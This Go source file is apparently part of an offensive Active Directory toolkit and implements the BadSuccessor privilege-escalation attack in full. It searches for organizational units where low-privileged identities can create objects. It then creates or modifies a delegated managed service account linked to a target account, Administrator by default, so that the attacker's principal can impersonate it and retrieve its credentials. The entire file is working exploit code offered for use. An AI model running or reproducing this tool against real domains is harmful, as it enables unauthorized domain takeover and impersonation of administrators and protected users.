// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package main

import (
	"crypto/rand"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"gopacket/pkg/flags"
	"gopacket/pkg/ldap"
	"gopacket/pkg/security"
	"gopacket/pkg/session"

	goldap "github.com/go-ldap/ldap/v3"
)

// dMSA object class GUID for BadSuccessor
const dmsaObjectClassGUID = "0feb936f-47b3-49f2-9386-1dedc2c23765"

// Relevant rights for BadSuccessor vulnerability check
const (
	createChild = 0x00000001
	genericAll  = 0x10000000
	writeDACL   = 0x00040000
	writeOwner  = 0x00080000
)

// Excluded SIDs from vulnerability search
var excludedSIDs = map[string]bool{
	"S-1-5-32-544": true, // BUILTIN\Administrators
	"S-1-5-18":     true, // SYSTEM
}

// Domain-relative RIDs to exclude
var excludedRIDs = map[uint32]bool{
	512: true, // Domain Admins
	519: true, // Enterprise Admins
}

func main() {
	// Tool-specific flags
	action := flag.String("action", "search", "Action to perform: add, delete, modify, or search")
	dmsaName := flag.String("dmsa-name", "", "Name of dMSA to add. If omitted, a random dMSA-[A-Z0-9]{8} will be used")
	targetOU := flag.String("target-ou", "", "Target OU for dMSA operations (e.g., \"OU=weakOU,DC=domain,DC=local\")")
	principalsAllowed := flag.String("principals-allowed", "", "Username allowed to retrieve the managed password. If omitted, current username will be used")
	targetAccount := flag.String("target-account", "Administrator", "Target account to impersonate (can target Domain Admins, Protected Users, etc.)")
	dnsHostname := flag.String("dns-hostname", "", "DNS hostname for the dMSA. If omitted, will be generated as dmsaname.domain")
	baseDN := flag.String("baseDN", "", "Set baseDN for LDAP. If omitted, the domain part will be used")
	method := flag.String("method", "LDAPS", "Method of adding the dMSA. LDAPS has some certificate requirements and isn't always available")

	opts := flags.Parse()

	// Use port from opts if provided, otherwise use method defaults
	port := opts.Port

	if opts.TargetStr == "" {
		flag.Usage()
		os.Exit(1)
	}

	// Validate action
	*action = strings.ToLower(*action)
	switch *action {
	case "add":
		if *targetOU == "" {
			log.Fatal("[-] Action 'add' requires -target-ou parameter")
		}
	case "delete":
		if *dmsaName == "" || *targetOU == "" {
			log.Fatal("[-] Action 'delete' requires -dmsa-name and -target-ou parameters")
		}
	case "modify":
		if *dmsaName == "" || *targetOU == "" || *targetAccount == "" {
			log.Fatal("[-] Action 'modify' requires -dmsa-name, -target-ou, and -target-account parameters")
		}
	case "search":
		// No additional params required
	default:
		log.Fatalf("[-] Unknown action: %s", *action)
	}

	// Parse target string
	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		log.Fatalf("[-] Error parsing target string: %v", err)
	}
	opts.ApplyToSession(&target, &creds)

	// For Kerberos: use dc-ip for LDAP connection if target is a hostname
	if creds.DCIP != "" && target.IP == "" {
		target.IP = creds.DCIP
	}

	// Determine LDAP vs LDAPS
	useLDAPS := strings.ToUpper(*method) == "LDAPS"

	// Set port - default based on method if not specified (or default 445 from SMB)
	if port == 0 || port == 445 {
		if useLDAPS {
			target.Port = 636
		} else {
			target.Port = 389
		}
	} else {
		target.Port = port
	}

	if !opts.NoPass {
		if err := session.EnsurePassword(&creds); err != nil {
			log.Fatal(err)
		}
	}

	// Initialize LDAP Client
	client := ldap.NewClient(target, &creds)
	defer client.Close()

	fmt.Printf("[*] Connecting to %s...\n", target.Addr())
	if err := client.Connect(useLDAPS); err != nil {
		log.Fatalf("[-] Connection failed: %v", err)
	}

	// Build bind user - for non-Kerberos auth use UPN format
	if creds.Domain != "" && creds.Hash == "" && !creds.UseKerberos && os.Getenv("GOPACKET_NO_UPN") == "" {
		creds.Username = fmt.Sprintf("%s@%s", creds.Username, creds.Domain)
		creds.Domain = ""
	}

	fmt.Printf("[*] Binding as %s...\n", creds.Username)
	if err := client.Login(); err != nil {
		log.Fatalf("[-] Bind failed: %v", err)
	}
	fmt.Println("[+] Bind successful.")

	// Determine base DN
	var baseContext string
	if *baseDN != "" {
		baseContext = *baseDN
	} else {
		baseContext, err = client.GetDefaultNamingContext()
		if err != nil {
			log.Fatalf("[-] Failed to get Naming Context: %v", err)
		}
	}
	fmt.Printf("[*] Base DN: %s\n", baseContext)

	// Execute action
	badsucc := &BadSuccessor{
		client:            client,
		baseDN:            baseContext,
		dmsaName:          *dmsaName,
		targetOU:          *targetOU,
		principalsAllowed: *principalsAllowed,
		targetAccount:     *targetAccount,
		dnsHostname:       *dnsHostname,
		domain:            getDomainFromBaseDN(baseContext),
		username:          creds.Username,
	}

	var success bool
	switch *action {
	case "search":
		success = badsucc.SearchOUs()
	case "add":
		success = badsucc.AddDMSA()
	case "delete":
		success = badsucc.DeleteDMSA()
	case "modify":
		success = badsucc.ModifyDMSA()
	}

	if !success {
		os.Exit(1)
	}
}

// BadSuccessor encapsulates the dMSA exploitation functionality
type BadSuccessor struct {
	client            *ldap.Client
	baseDN            string
	dmsaName          string
	targetOU          string
	principalsAllowed string
	targetAccount     string
	dnsHostname       string
	domain            string
	username          string
}

// SearchOUs searches for OUs vulnerable to BadSuccessor attack
func (b *BadSuccessor) SearchOUs() bool {
	fmt.Println("[*] Searching for OUs vulnerable to BadSuccessor attack...")

	// Check for Windows Server 2025 DCs
	prereqFlag := b.checkWin2025DC()
	if !prereqFlag {
		fmt.Println("[*] No Windows Server 2025 Domain Controllers found. This script requires at least one DC running Windows Server 2025.")
		fmt.Println("[*] Resulting list of Identities/OUs will show Identities that have permissions to create objects in OUs.")
	}

	// Get domain SID for filtering
	domainSID := b.getDomainSID()

	// Search for all OUs with their security descriptors
	sdControl := ldap.NewControlMicrosoftSDFlags(0x05) // OWNER | DACL
	results, err := b.client.SearchWithControls(
		b.baseDN,
		"(objectClass=organizationalUnit)",
		[]string{"distinguishedName", "nTSecurityDescriptor"},
		[]goldap.Control{sdControl},
	)
	if err != nil {
		log.Printf("[-] Failed to search for organizational units: %v", err)
		return false
	}

	fmt.Printf("[*] Found %d organizational units\n", len(results.Entries))

	// Map of identity -> list of vulnerable OUs
	allowedIdentities := make(map[string][]string)

	// Relevant object type GUIDs
	relevantObjectTypes := map[string]bool{
		"00000000-0000-0000-0000-000000000000": true, // All Objects
		dmsaObjectClassGUID:                    true, // msDS-DelegatedManagedServiceAccount
	}

	for _, entry := range results.Entries {
		ouDN := entry.DN
		sdRaw := entry.GetRawAttributeValue("nTSecurityDescriptor")
		if len(sdRaw) == 0 {
			continue
		}

		sd, err := security.ParseSecurityDescriptor(sdRaw)
		if err != nil {
			continue
		}

		// Check owner
		if sd.Owner != nil {
			ownerSID := sd.Owner.String()
			if !b.isExcludedSID(ownerSID, domainSID) {
				identity := b.resolveSIDToName(ownerSID)
				if _, exists := allowedIdentities[identity]; !exists {
					allowedIdentities[identity] = []string{}
				}
				if !contains(allowedIdentities[identity], ouDN) {
					allowedIdentities[identity] = append(allowedIdentities[identity], ouDN)
				}
			}
		}

		// Check DACL
		if sd.DACL == nil {
			continue
		}

		for _, ace := range sd.DACL.ACEs {
			// Only process ALLOW ACEs
			if ace.Type != security.ACCESS_ALLOWED_ACE_TYPE && ace.Type != security.ACCESS_ALLOWED_OBJECT_ACE_TYPE {
				continue
			}

			// Check if ACE has relevant rights
			mask := ace.Mask
			hasRelevantRight := (mask&createChild) != 0 || (mask&genericAll) != 0 ||
				(mask&writeDACL) != 0 || (mask&writeOwner) != 0
			if !hasRelevantRight {
				continue
			}

			// Check object type for object ACEs
			if ace.Type == security.ACCESS_ALLOWED_OBJECT_ACE_TYPE {
				if ace.ObjectFlags&security.ACE_OBJECT_TYPE_PRESENT != 0 {
					objGUID := ace.ObjectType.String()
					if !relevantObjectTypes[objGUID] {
						continue
					}
				}
			}

			sidStr := ace.SID.String()
			if b.isExcludedSID(sidStr, domainSID) {
				continue
			}

			identity := b.resolveSIDToName(sidStr)
			if _, exists := allowedIdentities[identity]; !exists {
				allowedIdentities[identity] = []string{}
			}
			if !contains(allowedIdentities[identity], ouDN) {
				allowedIdentities[identity] = append(allowedIdentities[identity], ouDN)
			}
		}
	}

	// Display results
	fmt.Println()
	if len(allowedIdentities) > 0 {
		fmt.Printf("[+] Found %d identities with BadSuccessor privileges:\n", len(allowedIdentities))
	} else {
		fmt.Println("[*] No identities found with BadSuccessor privileges")
	}
	fmt.Println()
	fmt.Printf("%-50s %s\n", "Identity", "Vulnerable OUs")
	fmt.Printf("%-50s %s\n", strings.Repeat("-", 50), strings.Repeat("-", 30))

	if len(allowedIdentities) == 0 {
		fmt.Printf("%-50s %s\n", "(none)", "(none)")
	} else {
		for identity, ous := range allowedIdentities {
			ouList := "{" + strings.Join(ous, ", ") + "}"
			if len(identity) > 50 {
				identity = identity[:47] + "..."
			}
			fmt.Printf("%-50s %s\n", identity, ouList)
		}
	}

	return true
}

// AddDMSA creates a new dMSA account
func (b *BadSuccessor) AddDMSA() bool {
	// Generate name if not provided
	if b.dmsaName == "" {
		b.dmsaName = b.generateDMSAName()
	}

	dmsaDN := fmt.Sprintf("CN=%s,%s", b.dmsaName, b.targetOU)

	// Check if account already exists
	if b.checkAccountExists(dmsaDN) {
		log.Printf("[-] dMSA account already exists: %s", dmsaDN)
		return false
	}

	// Resolve principals allowed
	principal := b.principalsAllowed
	if principal == "" {
		// Use current username (strip domain prefix/suffix)
		principal = b.username
		if strings.Contains(principal, "@") {
			principal = strings.Split(principal, "@")[0]
		}
		if strings.Contains(principal, "\\") {
			principal = strings.Split(principal, "\\")[1]
		}
	}

	// Get principal's SID for msDS-GroupMSAMembership
	principalSID, err := b.getAccountSID(principal)
	if err != nil {
		log.Printf("[-] Failed to resolve principal SID: %v", err)
		return false
	}

	// Build security descriptor for msDS-GroupMSAMembership
	groupMSAMembership := b.buildSecurityDescriptor(principalSID)
	if groupMSAMembership == nil {
		log.Printf("[-] Failed to build security descriptor for GroupMSAMembership")
		return false
	}

	// Resolve target account DN
	targetAccountVal := b.targetAccount
	if targetAccountVal == "" {
		targetAccountVal = "Administrator"
	}
	targetDN, err := b.getAccountDN(targetAccountVal)
	if err != nil {
		log.Printf("[-] Target account not found: %s", targetAccountVal)
		return false
	}

	// Generate DNS hostname if not provided
	dnsHost := b.dnsHostname
	if dnsHost == "" {
		dnsHost = fmt.Sprintf("%s.%s", strings.ToLower(b.dmsaName), b.domain)
	}

	// Build attributes for dMSA
	attributes := map[string][]string{
		"objectClass":                       {"msDS-DelegatedManagedServiceAccount"},
		"cn":                                {b.dmsaName},
		"sAMAccountName":                    {b.dmsaName + "$"},
		"dNSHostName":                       {dnsHost},
		"userAccountControl":                {"4096"},
		"msDS-ManagedPasswordInterval":      {"30"},
		"msDS-DelegatedMSAState":            {"2"},
		"msDS-SupportedEncryptionTypes":     {"28"},
		"accountExpires":                    {"9223372036854775807"},
		"msDS-ManagedAccountPrecededByLink": {targetDN},
	}

	// Add the dMSA
	err = b.client.Add(dmsaDN, attributes)
	if err != nil {
		log.Printf("[-] dMSA creation failed: %v", err)
		return false
	}

	// Set msDS-GroupMSAMembership and nTSecurityDescriptor using ModifyRaw
	err = b.client.ModifyRaw(dmsaDN, goldap.AddAttribute, "msDS-GroupMSAMembership", groupMSAMembership, nil)
	if err != nil {
		log.Printf("[!] Warning: Failed to set msDS-GroupMSAMembership: %v", err)
	}

	err = b.client.ModifyRaw(dmsaDN, goldap.AddAttribute, "nTSecurityDescriptor", groupMSAMembership, nil)
	if err != nil {
		log.Printf("[!] Warning: Failed to set nTSecurityDescriptor: %v", err)
	}

	// Print results
	fmt.Println()
	fmt.Printf("%-30s %s\n", strings.Repeat("-", 30), strings.Repeat("-", 30))
	fmt.Printf("%-30s %s\n", "dMSA Name:", b.dmsaName+"$")
	fmt.Printf("%-30s %s\n", "DNS Hostname:", dnsHost)
	fmt.Printf("%-30s %s\n", "Migration status:", "2")
	fmt.Printf("%-30s %s\n", "Principals Allowed:", principal)
	fmt.Printf("%-30s %s\n", "Target Account:", targetAccountVal)

	fmt.Println("[+] dMSA created successfully")
	return true
}

// DeleteDMSA removes an existing dMSA account
func (b *BadSuccessor) DeleteDMSA() bool {
	dmsaDN := fmt.Sprintf("CN=%s,%s", b.dmsaName, b.targetOU)

	if !b.checkAccountExists(dmsaDN) {
		log.Printf("[-] dMSA account does not exist: %s", dmsaDN)
		return false
	}

	err := b.client.Delete(dmsaDN)
	success := err == nil

	fmt.Println()
	fmt.Printf("%-30s %s\n", "dMSA Deletion Results", "")
	fmt.Printf("%-30s %s\n", strings.Repeat("-", 30), strings.Repeat("-", 30))
	fmt.Printf("%-30s %s\n", "dMSA Name:", b.dmsaName+"$")
	if success {
		fmt.Printf("%-30s %s\n", "Status:", "SUCCESS")
	} else {
		fmt.Printf("%-30s %s\n", "Status:", "FAILED")
		log.Printf("[-] Error: %v", err)
	}

	return success
}

// ModifyDMSA modifies an existing dMSA's target account
func (b *BadSuccessor) ModifyDMSA() bool {
	dmsaDN := fmt.Sprintf("CN=%s,%s", b.dmsaName, b.targetOU)

	if !b.checkAccountExists(dmsaDN) {
		log.Printf("[-] dMSA account does not exist: %s", dmsaDN)
		return false
	}

	// Get current target account
	results, err := b.client.Search(dmsaDN, "(objectClass=msDS-DelegatedManagedServiceAccount)",
		[]string{"msDS-ManagedAccountPrecededByLink"})
	if err != nil || len(results.Entries) == 0 {
		log.Printf("[-] Failed to retrieve dMSA: %v", err)
		return false
	}

	currentTargetDN := results.Entries[0].GetAttributeValue("msDS-ManagedAccountPrecededByLink")

	// Resolve new target account
	newTargetDN, err := b.getAccountDN(b.targetAccount)
	if err != nil {
		log.Printf("[-] Target account not found: %s", b.targetAccount)
		return false
	}

	if currentTargetDN == newTargetDN {
		fmt.Printf("[*] Target account is already set to: %s\n", newTargetDN)
		fmt.Println("[*] No modifications needed.")
		return true
	}

	// Modify the target
	changes := []ldap.ModifyChange{
		{
			Operation: goldap.ReplaceAttribute,
			AttrName:  "msDS-ManagedAccountPrecededByLink",
			AttrVals:  []string{newTargetDN},
		},
	}

	err = b.client.Modify(dmsaDN, changes)
	if err != nil {
		log.Printf("[-] Failed to modify dMSA: %v", err)
		return false
	}

	fmt.Printf("[+] dMSA target account modified: %s -> %s\n", currentTargetDN, newTargetDN)
	return true
}

// Helper functions

func (b *BadSuccessor) checkWin2025DC() bool {
	results, err := b.client.Search(
		b.baseDN,
		"(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
		[]string{"operatingSystem", "operatingSystemVersion"},
	)
	if err != nil {
		return false
	}

	for _, entry := range results.Entries {
		os := entry.GetAttributeValue("operatingSystem")
		osVer := entry.GetAttributeValue("operatingSystemVersion")
		if strings.Contains(os, "Windows Server 2025") || strings.Contains(osVer, "26100") {
			fmt.Printf("[+] Found Windows Server 2025 Domain Controller: %s\n", entry.DN)
			return true
		}
	}
	return false
}

func (b *BadSuccessor) getDomainSID() string {
	results, err := b.client.Search(b.baseDN, "(objectClass=domain)", []string{"objectSid"})
	if err != nil || len(results.Entries) == 0 {
		return ""
	}

	sidRaw := results.Entries[0].GetRawAttributeValue("objectSid")
	if len(sidRaw) == 0 {
		return ""
	}

	sid, _, err := security.ParseSIDBytes(sidRaw)
	if err != nil {
		return ""
	}
	return sid.String()
}

func (b *BadSuccessor) isExcludedSID(sidStr, domainSID string) bool {
	if excludedSIDs[sidStr] {
		return true
	}

	// Check domain-relative RIDs
	if domainSID != "" && strings.HasPrefix(sidStr, domainSID+"-") {
		ridStr := sidStr[len(domainSID)+1:]
		var rid uint32
		fmt.Sscanf(ridStr, "%d", &rid)
		if excludedRIDs[rid] {
			return true
		}
	}

	return false
}

func (b *BadSuccessor) resolveSIDToName(sidStr string) string {
	// Check well-known SIDs
	if name, ok := security.WellKnownSIDs[sidStr]; ok {
		return name
	}

	// Try LDAP lookup
	sidBytes := b.parseSIDString(sidStr)
	if sidBytes == nil {
		return sidStr
	}

	filter := fmt.Sprintf("(objectSid=%s)", hexEscapeBinary(sidBytes))
	results, err := b.client.Search(b.baseDN, filter, []string{"sAMAccountName"})
	if err != nil || len(results.Entries) == 0 {
		return sidStr
	}

	name := results.Entries[0].GetAttributeValue("sAMAccountName")
	if name != "" {
		return fmt.Sprintf("%s\\%s", strings.ToUpper(b.domain), name)
	}
	return sidStr
}

func (b *BadSuccessor) parseSIDString(sidStr string) []byte {
	sid, err := security.ParseSID(sidStr)
	if err != nil {
		return nil
	}
	return sid.Marshal()
}

func (b *BadSuccessor) checkAccountExists(dn string) bool {
	results, err := b.client.SearchBase(dn, "(objectClass=*)", []string{"cn"})
	return err == nil && len(results.Entries) > 0
}

func (b *BadSuccessor) generateDMSAName() string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	suffix := make([]byte, 8)
	randomBytes := make([]byte, 8)
	rand.Read(randomBytes)
	for i := range suffix {
		suffix[i] = charset[int(randomBytes[i])%len(charset)]
	}
	return fmt.Sprintf("dMSA-%s", string(suffix))
}

func (b *BadSuccessor) getAccountSID(accountName string) (string, error) {
	filter := fmt.Sprintf("(&(objectClass=user)(sAMAccountName=%s))", goldap.EscapeFilter(accountName))
	results, err := b.client.Search(b.baseDN, filter, []string{"objectSid"})
	if err != nil {
		return "", err
	}
	if len(results.Entries) == 0 {
		return "", fmt.Errorf("account not found: %s", accountName)
	}

	sidRaw := results.Entries[0].GetRawAttributeValue("objectSid")
	if len(sidRaw) == 0 {
		return "", fmt.Errorf("account has no objectSid")
	}

	sid, _, err := security.ParseSIDBytes(sidRaw)
	if err != nil {
		return "", err
	}
	return sid.String(), nil
}

func (b *BadSuccessor) getAccountDN(accountName string) (string, error) {
	filter := fmt.Sprintf("(&(objectClass=*)(sAMAccountName=%s))", goldap.EscapeFilter(accountName))
	results, err := b.client.Search(b.baseDN, filter, []string{"distinguishedName", "objectClass"})
	if err != nil {
		return "", err
	}
	if len(results.Entries) == 0 {
		return "", fmt.Errorf("account not found: %s", accountName)
	}

	// Prefer user or computer objects
	for _, entry := range results.Entries {
		classes := entry.GetAttributeValues("objectClass")
		for _, class := range classes {
			if strings.ToLower(class) == "user" || strings.ToLower(class) == "computer" {
				return entry.DN, nil
			}
		}
	}

	// Return first match
	return results.Entries[0].DN, nil
}

func (b *BadSuccessor) buildSecurityDescriptor(userSID string) []byte {
	sid, err := security.ParseSID(userSID)
	if err != nil {
		return nil
	}

	// Build a security descriptor with owner and DACL granting GenericAll to the user
	sd := &security.SecurityDescriptor{
		Revision: 1,
		Control:  security.SE_DACL_PRESENT | security.SE_SELF_RELATIVE,
		Owner:    sid,
	}

	// Create DACL with ACEs granting access to the user
	acl := &security.ACL{
		AclRevision: 4,
	}

	// ACE 1: Full Control
	ace1 := &security.ACE{
		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
		Flags: 0,
		Mask:  0x000F01FF, // Full Control
		SID:   sid,
	}
	acl.AddACE(ace1)

	// ACE 2: Generic All
	ace2 := &security.ACE{
		Type:  security.ACCESS_ALLOWED_ACE_TYPE,
		Flags: 0,
		Mask:  security.GENERIC_ALL,
		SID:   sid,
	}
	acl.AddACE(ace2)

	sd.DACL = acl

	return sd.Marshal()
}

func getDomainFromBaseDN(baseDN string) string {
	parts := strings.Split(baseDN, ",")
	var domainParts []string
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToLower(part), "dc=") {
			domainParts = append(domainParts, part[3:])
		}
	}
	return strings.Join(domainParts, ".")
}

func hexEscapeBinary(data []byte) string {
	var b strings.Builder
	for _, c := range data {
		fmt.Fprintf(&b, "\\%02x", c)
	}
	return b.String()
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
